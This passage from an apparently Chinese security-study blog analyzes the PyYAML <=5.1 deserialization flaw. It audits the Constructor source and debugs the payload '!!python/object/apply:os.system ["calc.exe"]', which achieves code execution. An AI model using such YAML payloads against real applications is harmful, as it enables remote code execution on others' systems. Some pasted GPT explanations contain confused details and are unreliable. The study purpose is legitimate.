        <span class="hljs-string">'zip'</span>: <span class="hljs-string">'12345'</span>
    }
}

yaml_data = yaml.dump(data)

<span class="hljs-built_in">print</span>(yaml_data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">address</span>:
  city: Anytown
  state: CA
  street: <span class="hljs-number">123</span> Main St
  zip: <span class="hljs-string">'12345'</span>
age: <span class="hljs-number">30</span>
hobbies:
- reading
- swimming
- traveling
is_student: true
name: John</code></pre>
<p>在这段代码中， 我们定义了一个data字典，然后使用yaml.dump方法将data对象序列为yaml格式，并赋值给yaml_data，最后打印出来，得到我们最终的yaml格式数据</p>
<p>其实通俗点来说，就是将python的对象实例转化为yaml格式的字符串，也就是<strong>序列化</strong>。</p>
<p>如果我们的Python对象中包含自定义类的实例、函数等，那么使用<code>yaml.dump</code>方法进行序列化可能会导致安全问题。攻击者可以通过在YAML数据中注入恶意代码来执行任意代码，从而导致应用程序受到攻击。</p>
<h3 id="python-gtyaml">python-&gt;yaml</h3>
<p><strong>load()</strong></p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data)</code></pre>
<p><code>load(data)</code>是将YAML格式的字符串转换为Python对象的方法。它将YAML格式的字符串反序列化为Python对象，并返回这个对象。在这个方法中，<code>data</code>是一个包含YAML格式字符串的变量，可以是从文件中读取的字符串，也可以是用户输入的字符串等。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

data = <span class="hljs-string">"""</span>
<span class="hljs-string">address:</span>
<span class="hljs-string">  city: Anytown</span>
<span class="hljs-string">  state: CA</span>
<span class="hljs-string">  street: 123 Main St</span>
<span class="hljs-string">  zip: '12345'</span>
<span class="hljs-string">age: 30</span>
<span class="hljs-string">hobbies:</span>
<span class="hljs-string">- reading</span>
<span class="hljs-string">- swimming</span>
<span class="hljs-string">- traveling</span>
<span class="hljs-string">is_student: true</span>
<span class="hljs-string">name: John</span>
<span class="hljs-string">"""</span>

yaml_data = yaml.load(data, Loader=yaml.Loader)
<span class="hljs-built_in">print</span>(yaml_data)</code></pre>
<p>这里看文章他只使用load(data)就能行，但我这里必须添加Loader解析器参数</p>
<pre><code class="hljs scss">{'<span class="hljs-selector-tag">address</span>': {'city': <span class="hljs-string">'Anytown'</span>, <span class="hljs-string">'state'</span>: <span class="hljs-string">'CA'</span>, <span class="hljs-string">'street'</span>: <span class="hljs-string">'123 Main St'</span>, <span class="hljs-string">'zip'</span>: <span class="hljs-string">'12345'</span>}, 'age': <span class="hljs-number">30</span>, <span class="hljs-string">'hobbies'</span>: [<span class="hljs-string">'reading'</span>, <span class="hljs-string">'swimming'</span>, <span class="hljs-string">'traveling'</span>], <span class="hljs-string">'is_student'</span>: True, <span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>}</code></pre>
<p>这段代码是将一个包含YAML格式字符串的变量<code>yaml_data</code><strong>反序列化</strong>为Python对象，并将其赋值给变量<code>data</code>。然后，它打印出<code>data</code>，输出反序列化后的Python对象。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data, Loader=yaml.Loader)</code></pre>
<p><code>load(data, Loader=yaml.Loader)</code>是将YAML格式的字符串转换为Python对象的方法，其中<code>Loader</code>参数指定了YAML解析器的类型。</p>
<p>在默认情况下，<code>yaml.load</code>方法使用的解析器是<code>yaml.SafeLoader</code>，它可以安全地解析大多数YAML格式数据，但是不能解析包含Python对象的YAML数据。</p>
<p>&lt;=5.1 版本中提供了几个方法用于解析 YAML：</p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.load</span>：加载单个 YAML 配置
yaml<span class="hljs-selector-class">.load_all</span>：加载多个 YAML 配置</code></pre>
<p>这里说明一下PyYaml&lt;=5.1版本的Loader都有哪些加载器</p>
<pre><code class="hljs scss">Constructor:<span class="hljs-number">5.1</span>版本一下默认此加载器，在 YAML 规范上新增了很多强制类型转换
BaseConstructor：不支持强制类型转换
SafeConstructor：支持强制类型转换和 YAML 规范保持一致</code></pre>
<p>这里以默认的Constructor加载器为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-comment"># 自定义构造器函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_person</span>(<span class="hljs-params">loader, node</span>):
    <span class="hljs-comment"># 获取Person类的属性值</span>
    data = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-comment"># 实例化Person类并设置属性</span>
    <span class="hljs-keyword">return</span> Person(data[<span class="hljs-string">'name'</span>], data[<span class="hljs-string">'age'</span>])

<span class="hljs-comment"># 将!python/object标签映射到自定义构造器函数</span>
yaml.add_constructor(<span class="hljs-string">'!python/object:__main__.Person'</span>, construct_person)

<span class="hljs-comment"># 定义一个包含自定义类实例的YAML数据</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">name: John</span>
<span class="hljs-string">age: 30</span>
<span class="hljs-string">person:</span>
<span class="hljs-string">  !python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.Loader()方法解析YAML数据</span>
data = yaml.load(yaml_data, Loader=yaml.Loader)

<span class="hljs-comment"># 输出解析后的Python对象</span>
<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">{'name': <span class="hljs-string">'John'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>, <span class="hljs-string">'person'</span>: &lt;__main__.Person object at <span class="hljs-number">0</span>x000001BA17055390&gt;}</code></pre>
<p>这里对于代码有许多不懂得地方，结合GPT理解一番</p>
<p>首先看这行代码<code>yaml.add_constructor('!python/object:__main__.Person', construct_person)</code></p>
<p>这里就是将<code>!python/object:__main__.Person</code>标签映射到construct_person函数，也就是说，当我们在解析yaml数据的时候，如果遇到了<code>!python/object:__main__.Person</code>标签，那就会自动的去调用construct_person函数。</p>
<p>而construct_person函数有两个参数，其中的node参数实际代表着节点，也就是<code>!python/object:__main__.Person</code>标签所对应的节点person，在调用construct_person函数的时候，会将person节点赋值给node，接着通过loader.construct_mapping函数，获取person节点中的属性值，转换为字典的形式，赋值给data参数，最后return的时候，实例化Person类，将对应的键值传入</p>
<p><strong>load_all(data)</strong>——该函数上面也提到过，这里举个例子来理解</p>
<p><code>load_all(data)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串。<code>load_all</code>函数是<code>PyYAML</code>模块中的一个方法，用于从一个包含多个YAML文档的字符串中解析出所有的YAML文档，并返回一个生成器对象，每个元素都是一个Python对象，对应一个YAML文档。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-comment"># 定义包含两个YAML文档的字符串</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- name: John</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string"></span>
<span class="hljs-string">- name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs = yaml.load_all(yaml_data, Loader=yaml.Loader)<span class="hljs-comment">#这里我仍然需要指定解析器参数</span>

<span class="hljs-comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205101617.png" alt="image-20240323205101617"></p>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load_all</span>(data, Loader=yaml.Loader)</code></pre>
<p><code>load_all(data, Loader=yaml.Loader)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串，<code>yaml.Loader</code>是<code>PyYAML</code>模块中的一个解析器，用于解析YAML文档。</p>
<p>这里以默认的加载器Constructor为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-comment"># 定义包含两个YAML文档的字符串</span>
yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- name: John</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string"></span>
<span class="hljs-string">- name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs = yaml.load_all(yaml_data, Loader=yaml.Loader)

<span class="hljs-comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>, <span class="hljs-string">'age'</span>: 30}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}]</span></code></pre>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<p>以上是PyYaml&lt;=5.1版本中常见的一些方法实现python和Yaml语言格式的转换的方法，但是往往在这种语言格式的转换的同时，也会存在一定的漏洞点的。</p>
<h2 id="漏洞成因rce">漏洞成因–RCE</h2>
<p>主要在PyYaml&lt;=5.1的版本下，默认<strong>Constructor</strong>为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。</p>
<p><a target="_blank" rel="noopener" href="http://xn--Constructor-km8qoeb784a8wr1o0exxutv1s.py">下面我们分析一下Constructor.py</a>，找一找在解析Python标签时的源码。</p>
<h3 id="pythonobject标签">!!python/object标签</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323173508853.png" alt="image-20240323173508853"></p>
<p>这里跟进yaml包之后如上图的函数，继续跟进，可以找到处理!!python/object标签的函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object</span>(<span class="hljs-params">self, suffix, node</span>):
    <span class="hljs-comment"># Format:</span>
    <span class="hljs-comment">#   !!python/object:module.name { ... state ... }</span>
    instance = self.make_python_instance(suffix, node, newobj=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">yield</span> instance
    deep = <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">'__setstate__'</span>)
    state = self.construct_mapping(node, deep=deep)
    self.set_python_instance_state(instance, state)</code></pre>
<h3 id="pythonobjectapply标签">!!python/object/apply标签</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174218701.png" alt="image-20240323174218701"></p>
<h3 id="pythonobjectnew标签">!!python/object/new标签</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174321497.png" alt="image-20240323174321497"></p>
<h3 id="pythonmodule标签">!!python/module标签</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174544420.png" alt="image-20240323174544420"></p>
<h3 id="pythonname标签">!!python/name标签</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174607818.png" alt="image-20240323174607818"></p>
<p>看上面前两个标签会发现都调用了make_python_instance()这个函数方法，所以我们接着往下看make_python_instance()</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_python_instance</span>(<span class="hljs-params">self, suffix, node,</span>
<span class="hljs-params">            args=<span class="hljs-literal">None</span>, kwds=<span class="hljs-literal">None</span>, newobj=<span class="hljs-literal">False</span>, unsafe=<span class="hljs-literal">False</span></span>): <span class="hljs-comment">#用于创建Python对象的实例</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args:
            args = [] <span class="hljs-comment">#对args进行空值处理，如果不存在，将args设置为空列表</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kwds:
            kwds = {} <span class="hljs-comment">#对kwds进行空值处理，如果不存在，将kwds设置为空字典</span>
        cls = self.find_python_name(suffix, node.start_mark)<span class="hljs-comment">#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> i/sinstance(cls, <span class="hljs-built_in">type</span>)):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python instance"</span>, node.start_mark,
                    <span class="hljs-string">"expected a class, but found %r"</span> % <span class="hljs-built_in">type</span>(cls),
                    node.start_mark)<span class="hljs-comment">#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。</span>
        <span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):
            <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> cls(*args, **kwds)
        <span class="hljs-comment">#根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例</span></code></pre>
<p>审计了一下make_python_instance()函数，可以发现，这里是通过args和kwds参数动态的创建Python对象的实例，所以，我们是可以利用这个特点进行执行我们的恶意代码，从而实现攻击。</p>
<p>我们可以发现在make_python_instance()中又调用了find_python_name()函数，接下来继续审计find_python_name()</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"expected non-empty name appended to the tag"</span>, mark) <span class="hljs-comment">#如果name为空，将会报错</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">'.'</span> <span class="hljs-keyword">in</span> name:
            module_name, object_name = name.rsplit(<span class="hljs-string">'.'</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">#如果name中包含"."，将会对name进行分割为模板名和对象名</span>
        <span class="hljs-keyword">else</span>:
            module_name = <span class="hljs-string">'builtins'</span>
            object_name = name <span class="hljs-comment">#如果name中没有"."，则会将模板名命名为"builtins"，对象名命名为"name"</span>
        <span class="hljs-keyword">if</span> unsafe:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-built_in">__import__</span>(module_name) <span class="hljs-comment">#unsafe默认为False，所以可以利用__import__将模块导入</span>
            <span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> exc:
                <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                        <span class="hljs-string">"cannot find module %r (%s)"</span> % (module_name, exc), mark) <span class="hljs-comment">#如果ImportError异常，将会报错</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"module %r is not imported"</span> % module_name, mark)<span class="hljs-comment">#如果模块不在sys.modules字典中，将会报错</span>
        module = sys.modules[module_name]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"cannot find %r in the module %r"</span>
                    % (object_name, module.__name__), mark)<span class="hljs-comment">#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)<span class="hljs-comment">#利用getattr()函数获取返回值</span></code></pre>
<p>通过审计find_python_name()，我们发现还可以通过引用module的类创建对象，从而执行我们的恶意代码，实现攻击。</p>
<p>在上述代码看完之后，我还是有很多不懂的点，因此就想着直接看最终payload去调试分析。</p>
<p>这里明确的是!!python/object标签并不能实现RCE，具体的下面分析，但我们先分析剩下的可以实现RCE的原因</p>
<p>先看!!python/object/apply标签和!!python/object/new标签（因为这两个标签的处理方法一样，就是newobj值不一样，我们看看最终是否会影响结果）</p>
<h4 id="调试分析1">调试分析1</h4>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323181930329.png" alt="image-20240323181930329"></p>
<p>首先我们打一个端点，进入调试。步入之后，我们跟进get_single_data方法</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182001245.png" alt="image-20240323182001245"></p>
<p>继续跟进之后，我们来到下图位置，你也可以稍作尝试，会发现我们如果跟进construct_document方法的话，才是有趣的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182111649.png" alt="image-20240323182111649"></p>
<p>接下来就是无脑跟进，我们的重点就是观察其中参数值的变化，尤其是关注os.system与calc.exe分别在哪写参数上</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182238889.png" alt="image-20240323182238889"></p>
<p>如上图，我们会看到已经跟进到处理这两个标签的关键函数了，我们可以看一下各参数值</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182352277.png" alt="image-20240323182352277"></p>
<p>如上图，这里的suffix为我们的os.system，也就是我们想要动态实例化的Python对象，我们现在可以回顾一下我们之前写的payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

payload = <span class="hljs-string">'!!python/object/apply:os.system ["calc.exe"]'</span>
yaml.load(payload, Loader=yaml.Loader)</code></pre>
<p>我们是搞了个键值对!!python/object/apply标签对应，这里我是觉得分析得不如GPT，因此我直接给GPT的回答了</p>
<pre><code class="hljs scss">重点分析给定的 `payload` 字符串 `'!!python/<span class="hljs-selector-tag">object</span>/apply:os.system [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'` 的组成和语法结构，进行详细解释如下：</span>
<span class="hljs-string"></span>
<span class="hljs-string">1. `'</span>!!python/object/apply:os.system<span class="hljs-string">'`：</span>
<span class="hljs-string">   - `!!` 是 YAML 的标签前缀，用于指定要应用的标签类型。</span>
<span class="hljs-string">   - `python/object/apply:os.system` 是标签值，指定了要使用的构造器函数和模块路径。在这里，`apply` 标签表示要应用一个函数，`os.system` 是函数的路径，表示要调用 `os` 模块中的 `system` 函数。</span>
<span class="hljs-string"></span>
<span class="hljs-string">2. `["calc.exe"]`：</span>
<span class="hljs-string">   - 这是一个包含单个元素 `"calc.exe"` 的列表。</span>
<span class="hljs-string">   - 这个列表是作为参数传递给构造器函数 `os.system` 的参数列表。</span>
<span class="hljs-string"></span>
<span class="hljs-string">综合起来，给定的 `payload` 表达了一个 YAML 数据结构，它使用特定的标签和参数列表来构造一个对象。具体地说，它使用 `apply` 标签来调用 `os.system` 函数，将 `"calc.exe"` 作为参数传递给该函数。</span>
<span class="hljs-string"></span>
<span class="hljs-string">需要注意的是，由于这个 `payload` 包含了敏感操作 `os.system("calc.exe")`，在实际使用中应谨慎处理，以避免安全风险。在加载和解析此类 YAML 数据时，应确保可信任的数据源和适当的安全措施。</span></code></pre>
<p>说白了，就是靠python/object/apply指定了构造器函数（也就是我们默认的constructor），然后想要去调用os.system函数，并传入calc这个参数。这样的话，我们再继续看上述跟进到的位置</p>
<p>suffix很明显了，就是被赋值为了os.system函数，没啥说的，接下来可以看一下node节点参数的内容</p>
<pre><code class="hljs scss">node=<span class="hljs-built_in">SequenceNode</span>(tag='tag:yaml.org,<span class="hljs-number">2002</span>:python/object/apply:os.system', value=[ScalarNode(tag='tag:yaml.org,<span class="hljs-number">2002</span>:str', value='calc.exe')])</code></pre>
<p>对于为何 node 参数是这样的内容，GPT是这样回答的</p>
<p>对于给定的 YAML 数据 <code>!!python/object/new:os.system ["calc.exe"]</code>，如果将其进行反序列化（即使用适当的 YAML 解析器进行加载），则其中的 <code>node</code> 节点将是一个包含以下内容的字典：</p>
<pre><code class="hljs python">{
    <span class="hljs-string">'__yaml_tag__'</span>: <span class="hljs-string">'tag:yaml.org,2002:python/object/apply:os.system'</span>,
    <span class="hljs-string">'__args__'</span>: [<span class="hljs-string">'calc.exe'</span>]
}</code></pre>
<p>在这里，<code>node</code> 是一个字典，其中包含两个键值对：</p>
<ul>
<li><code>'__yaml_tag__'</code> 键表示 YAML 标签，指示要实例化的对象类型。在这种情况下，标签为 <code>'tag:yaml.org,2002:python/object/new:os.system'</code>，表示要使用 <code>os.system</code> 类进行实例化。</li>
<li><code>'__args__'</code> 键表示传递给构造函数的参数列表。在此示例中，<code>['calc.exe']</code> 是作为参数传递给 <code>os.system</code> 构造函数的参数列表。</li>
</ul>
<p>通过加载该 YAML 数据并解析 <code>node</code> 节点，可以使用相应的构造器函数和参数来实例化 <code>os.system</code> 类对象。请注意，由于该 YAML 数据包含敏感操作 <code>os.system("calc.exe")</code>，在实际使用中应谨慎处理，以避免安全风险。</p>
<p>好，我们知道了上述参数的具体构成，接下来继续跟进，如果我们尝试过，就知道这里需要跟进一下construct_sequence来看看具体的函数逻辑</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183135875.png" alt="image-20240323183135875"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183218060.png" alt="image-20240323183218060"></p>
<p>如上图，跟进之后看到这个函数，首先判断node的类型是否是SequenceNode，如果不是，则报错；否则，通过for语句提取出node中的value值然后返回，而我们知道其中的value值有一个calc.exe，这很有趣，继续跟进。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183801409.png" alt="image-20240323183801409"></p>
<p>这里发现最终child的value值成了calc.exe</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183952814.png" alt="image-20240323183952814"></p>
<p>如上图，该函数在处理node的时候判断其是否是MappingNode实例，但根据值我们知道肯定不是，于是直接跳到return语句</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184103109.png" alt="image-20240323184103109"></p>
<p>上述return语句继续跟进函数的话，会到达上图，因为node是ScalarNode实例，于是他就直接返回node的value=calc.exe，但这里我有点懵，我想知道先前node的第一个value去哪了？？？所以我们重新调试一下看看</p>
